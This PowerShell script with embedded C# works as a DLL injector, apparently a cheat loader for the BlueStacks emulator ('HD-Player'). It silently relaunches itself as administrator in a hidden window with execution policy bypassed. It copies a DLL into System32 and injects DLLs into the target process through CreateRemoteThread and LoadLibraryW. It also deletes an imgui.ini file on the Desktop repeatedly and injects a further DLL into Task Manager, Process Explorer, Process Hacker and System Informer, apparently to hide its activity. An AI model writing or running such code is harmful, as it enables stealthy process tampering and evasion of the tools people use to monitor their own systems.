# Auto-elevation function: Relaunch script as admin if not elevated
function Ensure-RunAsAdmin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    if (-not $isAdmin) {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
        $psi.Verb = "runas"
        $psi.UseShellExecute = $true
        $psi.WindowStyle = 'Hidden'
        try {
            [System.Diagnostics.Process]::Start($psi) | Out-Null
        } catch {
            Write-Error "User cancelled the elevation prompt."
        }
        exit
    }
}

Ensure-RunAsAdmin

# Start imgui.ini Monitor Loop as a background job
Start-Job -ScriptBlock {
    $desktopPath = [Environment]::GetFolderPath('Desktop')
    $iniPath = Join-Path $desktopPath "imgui.ini"
    while ($true) {
        if (Test-Path $iniPath) {
            try {
                Remove-Item $iniPath -Force -ErrorAction SilentlyContinue
                Write-Output "Deleted imgui.ini at $(Get-Date -Format 'HH:mm:ss')"
            } catch {}
        }
        Start-Sleep -Milliseconds 50
    }
} | Out-Null

# DLL paths and target process
$dllFolder = "C:\Windows\SysWOW64"
$dll1 = "Aotbst.dll"
$dll2 = "cimgui.dll"
$dll3 = "dwmhost.dll"
$extraDll = "abal.dll"
$processName = "HD-Player"
$system32Path = "$env:windir\System32"
$destDll3Path = Join-Path -Path $system32Path -ChildPath $dll3
$extraDllPath = Join-Path -Path $system32Path -ChildPath $extraDll

# Process Monitor List for tool injections
$monitorProcs = @("ProcessHacker", "SystemInformer", "procexp", "Taskmgr")
$injectedTools = @{}

# C# Injector
$injectorCode = @"
using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Injector {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int access, bool inherit, int pid);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint size, uint allocType, uint protect);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out UIntPtr written);
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint stackSize, IntPtr startAddress, IntPtr parameter, uint flags, IntPtr threadId);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
    public const int PROCESS_ALL = 0x1F0FFF;
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_READWRITE = 0x04;

    public static bool Inject(int pid, string dllPath) {
        IntPtr hProcess = OpenProcess(PROCESS_ALL, false, pid);
        if (hProcess == IntPtr.Zero) return false;

        IntPtr alloc = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * 2), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (alloc == IntPtr.Zero) return false;

        byte[] buffer = Encoding.Unicode.GetBytes(dllPath);
        WriteProcessMemory(hProcess, alloc, buffer, (uint)buffer.Length, out var written);

        IntPtr kernel32 = GetModuleHandle("kernel32.dll");
        IntPtr loadLib = GetProcAddress(kernel32, "LoadLibraryW");
        if (loadLib == IntPtr.Zero) return false;

        IntPtr thread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, alloc, 0, IntPtr.Zero);
        if (thread == IntPtr.Zero) return false;

        CloseHandle(hProcess);
        return true;
    }
}

public class KeyCheck {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    public static bool IsDelPressed() {
        return (GetAsyncKeyState(0x2E) & 0x8000) != 0;
    }
}
"@

Add-Type -TypeDefinition $injectorCode -Language CSharp

Write-Output "Monitoring for process $processName..."

# Main loop
while ($true) {
    # Inject into HD-Player
    $proc = Get-Process -Name $processName -ErrorAction SilentlyContinue
    if ($proc) {
        Write-Output "Found $processName with PID $($proc.Id). Waiting for [Del]..."
        while (-not [KeyCheck]::IsDelPressed()) {
            Start-Sleep -Milliseconds 50
        }

        Write-Output "[Del] pressed. Proceeding with injection..."
        try {
            Copy-Item -Path (Join-Path $dllFolder $dll3) -Destination $destDll3Path -Force
            Write-Output "Copied $dll3 to $system32Path"
        } catch {
            Write-Error "Failed to copy $dll3. Run as administrator."
            exit 1
        }

        $dllPaths = @(
            Join-Path $dllFolder $dll1,
            Join-Path $dllFolder $dll2
        )

        foreach ($dll in $dllPaths) {
            Write-Output "Injecting $dll into $processName..."
            if ([Injector]::Inject($proc.Id, $dll)) {
                Write-Output "Successfully injected $dll"
            } else {
                Write-Warning "Failed to inject $dll"
            }
        }

        do {
            Start-Sleep -Seconds 2
            $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
        } while ($proc)

        Write-Output "$processName exited. Resuming monitoring..."
    }

    # Monitor tool processes and inject Actioncenter.dll
    foreach ($toolProcName in $monitorProcs) {
        $toolList = Get-Process -Name $toolProcName -ErrorAction SilentlyContinue
        foreach ($toolProc in $toolList) {
            if (-not $toolProc) { continue }

            $pid = $toolProc.Id
            if ($injectedTools[$toolProcName] -eq $pid) {
                continue
            }

            # Try up to 3 times
            for ($i = 1; $i -le 3; $i++) {
                Write-Output "Injecting $extraDll into $toolProcName (PID: $pid) - Attempt $i"
                $result = [Injector]::Inject($pid, $extraDllPath)
                if ($result) {
                    Write-Output "✅ Successfully injected into $toolProcName (PID: $pid)"
                    $injectedTools[$toolProcName] = $pid
                    break
                } else {
                    Write-Warning "⚠️ Failed to inject into $toolProcName (PID: $pid), retrying..."
                    Start-Sleep -Milliseconds 300
                }
            }
        }
    }

    Start-Sleep -Milliseconds 500
}
